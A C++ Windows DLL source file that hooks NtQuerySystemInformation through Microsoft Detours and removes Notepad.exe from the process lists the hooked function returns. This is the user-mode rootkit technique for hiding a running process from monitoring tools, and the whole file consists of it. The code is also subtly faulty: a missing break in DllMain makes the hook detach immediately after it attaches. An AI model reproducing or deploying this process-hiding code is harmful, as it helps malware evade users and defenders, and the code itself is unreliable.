#include "pch.h"
#include <detours/detours.h>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#pragma comment(lib, "detours.lib")

using namespace std;

const wchar_t* TARGET_PROCESS = L"Notepad.exe";

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
static NtQuerySystemInformation_t _NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
    GetModuleHandle(L"ntdll.dll"),
    "NtQuerySystemInformation"
);

NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS result = _NtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );

    if (SystemInformationClass == 5 && result == 0 && SystemInformation != nullptr) {
        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prevInfo = nullptr;
        while (processInfo->NextEntryOffset || processInfo->UniqueProcessId) {
            bool hidden = false;
            if (processInfo->ImageName.Buffer != nullptr &&
                _wcsicmp(processInfo->ImageName.Buffer, TARGET_PROCESS) == 0) {
                hidden = true;
            }

            if (hidden && prevInfo != nullptr) {
                if (processInfo->NextEntryOffset == 0) {
                    prevInfo->NextEntryOffset = 0;
                }
                else {
                    prevInfo->NextEntryOffset += processInfo->NextEntryOffset;
                }
            }
            else {
                prevInfo = processInfo;
            }

            if (processInfo->NextEntryOffset == 0) break;
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
    }

    return result;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
        DetourTransactionCommit();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)_NtQuerySystemInformation, Hooked_NtQuerySystemInformation);
        DetourTransactionCommit();
    }
    return TRUE;
}

